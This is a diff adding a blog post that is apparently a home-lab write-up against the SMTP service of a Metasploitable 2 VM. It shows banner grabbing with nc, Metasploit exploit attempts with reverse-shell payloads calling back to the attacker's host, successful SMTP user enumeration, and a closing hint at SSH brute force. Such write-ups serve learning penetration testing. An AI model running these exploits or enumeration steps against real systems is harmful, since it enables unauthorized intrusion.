@@ -28,6 +28,177 @@
 </ul>     
 <hr>
 <div class="post-content">
+<!--hacking, metasploit, smtp-->
+
+<h1>Mailploitation</h1>
+
+<p>For this post I will target the SMTP server running on the Metasploitable 2 VM I have set up as my target. By now my approach
+should be clear:</p>
+
+<ol>
+<li>Identify target</li>
+<li>Find vulnerability</li>
+<li>Craft exploit</li>
+<li>???</li>
+<li>Profit!</li>
+</ol>
+
+<p>Let's see if I can apply the same tactic again!</p>
+
+<h2>The target and vulnerability</h2>
+
+<p>This time I am going to target the SMTP server running on the target (IP 192.168.56.103) :</p>
+
+<pre><code>25/tcp    open  smtp        Postfix smtpd
+</code></pre>
+
+<p>Now I want to find a vulnerability for this service. I don't have version number so first I am going to attempt to 
+find out some more information about the service. A regular banner grabbing with <code>nc</code> can reveal a lot of information. There is 
+a metasploit module for SMTP banner grabbing as well <code>auxiliary/scanner/smtp/smtp_version</code> but <code>msfconsole</code> is slow to load
+so I rather do it with <code>nc</code>:</p>
+
+<pre><code># nc 192.168.56.103 25
+220 metasploitable.localdomain ESMTP Postfix (Ubuntu)
+</code></pre>
+
+<p>That doesn't really tell me anything I didn't already know. As a side note, this technique (or similar) also works for other protocols
+for example FTP, SSH and HTTP. So the next step is to fire up <code>msfconsole</code> and do a search:</p>
+
+<pre><code>msf &gt; search smtp postfix
+
+Matching Modules
+================
+
+ Name                                        Disclosure Date  Description
+ ----                                        ---------------  -----------
+ auxiliary/client/smtp/emailer                                Generic Emailer (SMTP)
+ auxiliary/dos/smtp/sendmail_prescan         2003-09-17       Sendmail SMTP Address prescan Memory Corruption
+ auxiliary/fuzzers/smtp/smtp_fuzzer                           SMTP Simple Fuzzer
+ auxiliary/scanner/smtp/smtp_enum                             SMTP User Enumeration Utility
+ auxiliary/scanner/smtp/smtp_relay                            SMTP Open Relay Detection
+ auxiliary/scanner/smtp/smtp_version                          SMTP Banner Grabber
+ auxiliary/server/capture/smtp                                Authentication Capture: SMTP
+ auxiliary/vsploit/pii/email_pii                              VSploit Email PII
+ exploit/linux/misc/gld_postfix              2005-04-12       GLD (Greylisting Daemon) Postfix Buffer Overflow
+ exploit/linux/smtp/exim4_dovecot_exec       2013-05-03       Exim and Dovecot Insecure Configuration Command Injection
+ exploit/unix/smtp/clamav_milter_blackhole   2007-08-24       ClamAV Milter Blackhole-Mode Remote Code Execution
+ exploit/unix/smtp/exim4_string_format       2010-12-07       Exim4 string_format Function Heap Buffer Overflow
+ exploit/unix/webapp/squirrelmail_pgp_plugin 2007-07-09       SquirrelMail PGP Plugin Command Execution (SMTP)
+</code></pre>
+
+<p>In this output I have removed everything that is windows related and instead of removing the disclosure date I removed the ranking. Since
+the disclosure date will play a role later on.</p>
+
+<p>For let's focus on the exploits for now. How can I figure out if an exploit is applicable to the running server without trying everything?
+Well the is where the disclosure date comes in handy. But first, one interesting question is if we can apply a UNIX exploit to a Linux 
+system. The answer is: it depends. You might be able to use a UNIX exploit or cmd on a Linux target, the only way to find out is to
+try or read the source for the exploit. Now back to the dates, from a previous <code>nmap</code> scan we know that a bit about the OS:</p>
+
+<pre><code>Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.9 - 2.6.33
+</code></pre>
+
+<p>Linux 2.6.33 was released 24 February 2010, so by this date we can begin our search. 
+A single exploit was released that year so let's try that:</p>
+
+<pre><code>msf  &gt; use exploit/unix/smtp/exim4_string_format
+msf exploit(exim4_string_format) &gt; set RHOST 192.168.56.103 
+RHOST =&gt; 192.168.56.103
+msf exploit(exim4_string_format) &gt; set payload cmd/unix/reverse_ruby
+payload =&gt; cmd/unix/reverse_ruby
+msf exploit(exim4_string_format) &gt; set LHOST 192.168.56.102 
+LHOST =&gt; 192.168.56.102
+msf exploit(exim4_string_format) &gt; exploit
+
+[*] Started reverse handler on 192.168.56.102:4444 
+[*] Connecting to 192.168.56.103:25 ...
+[*] Server: 220 metasploitable.localdomain ESMTP Postfix (Ubuntu)
+[-] Exploit failed [no-target]: The target server is not running Exim!
+</code></pre>
+
+<p>So the target is not running Exim. This means that I can remove two exploits from the list, I can also remove the web app exploit 
+(unrelated to Exim) so the remaining exploits are:</p>
+
+<ul>
+<li><code>exploit/linux/misc/gld_postfix</code></li>
+<li><code>exploit/unix/smtp/clamav_milter_blackhole</code></li>
+</ul>
+
+<p>Let's try both:</p>
+
+<pre><code>msf &gt; use exploit/linux/misc/gld_postfix
+msf exploit(gld_postfix) &gt; set RHOST 192.168.56.103
+RHOST =&gt; 192.168.56.103
+msf exploit(gld_postfix) &gt; set RPORT 25
+RPORT =&gt; 25
+msf exploit(gld_postfix) &gt; set payload linux/x86/shell/reverse_tcp 
+payload =&gt; linux/x86/shell/reverse_tcp     
+msf exploit(gld_postfix) &gt; set LHOST 192.168.56.102 
+LHOST =&gt; 192.168.56.102
+msf exploit(gld_postfix) &gt; exploit
+
+[*] Started reverse handler on 192.168.56.102:4444
+</code></pre>
+
+<p>And nothing else happens, this is usually a sign that the exploit doesn't work. Specifically when no payload produces a different result.
+So I move to the last exploit:</p>
+
+<pre><code>msf &gt; use exploit/unix/smtp/clamav_milter_blackhole
+msf exploit(clamav_milter_blackhole) &gt; set RHOST 192.168.56.103 
+RHOST =&gt; 192.168.56.103
+msf exploit(clamav_milter_blackhole) &gt; set payload cmd/unix/reverse_ruby
+payload =&gt; cmd/unix/reverse_ruby
+msf exploit(clamav_milter_blackhole) &gt; set LHOST 192.168.56.102 
+LHOST =&gt; 192.168.56.102
+msf exploit(clamav_milter_blackhole) &gt; exploit
+
+[*] Started reverse handler on 192.168.56.102:4444
+</code></pre>
+
+<p>The same result, also the same for each payload. So I can conclude that the service is not vulnerable to any of the exploits in metasploit.</p>
+
+<h2>What else?</h2>
+
+<p>This attack seems to have failed so let's see what else I can do. Referring back to the list of available metasploit modules I see a module
+for user enumeration. It's always good to get users so let's do that.</p>
+
+<pre><code>msf &gt; use auxiliary/scanner/smtp/smtp_enum 
+msf auxiliary(smtp_enum) &gt; show options 
+
+Module options (auxiliary/scanner/smtp/smtp_enum):
+
+   Name       Current Setting      Required  Description
+   ----       ---------------      --------  -----------
+   RHOSTS                          yes       The target address range or CIDR identifier
+   RPORT      25                   yes       The target port
+   THREADS    1                    yes       The number of concurrent threads
+   UNIXONLY   true                 yes       Skip Microsoft bannered servers when testing unix users
+   USER_FILE  *snip*               yes       The file that contains a list of probable users accounts.
+</code></pre>
+
+<p>The USER_FILE variable is set to: <code>/usr/share/metasploit-framework/data/wordlists/unix_users.txt</code>, I removed it from the above output 
+since it looks horrible when it wraps on the blog. Now I set the required parameters and run it:</p>
+
+<pre><code>msf auxiliary(smtp_enum) &gt; set RHOSTS 192.168.56.103
+RHOSTS =&gt; 192.168.56.103
+msf auxiliary(smtp_enum) &gt; run
+
+[*] 192.168.56.103:25 Banner: 220 metasploitable.localdomain ESMTP Postfix (Ubuntu)
+[+] 192.168.56.103:25 Users found: backup, bin, daemon,  distccd, ftp, games, gnats, irc, libuuid, list, lp, mail, 
+    man, news, nobody, postgres, postmaster, proxy, service, sshd, sync, sys, syslog, user, uucp, www-data
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+</code></pre>
+
+<p>I get 26 hits, the wordlist I used has:</p>
+
+<pre><code># cat /usr/share/metasploit-framework/data/wordlists/unix_users.txt | wc -l
+110
+</code></pre>
+
+<p>110 lines, so I can assume it works. So now that I have a set of users I can something devious with that information. 
+Maybe brute force SSH or something like that, <em>wink wink</em>.</p>
 </div>
 <hr>
 <div class="container-fluid">
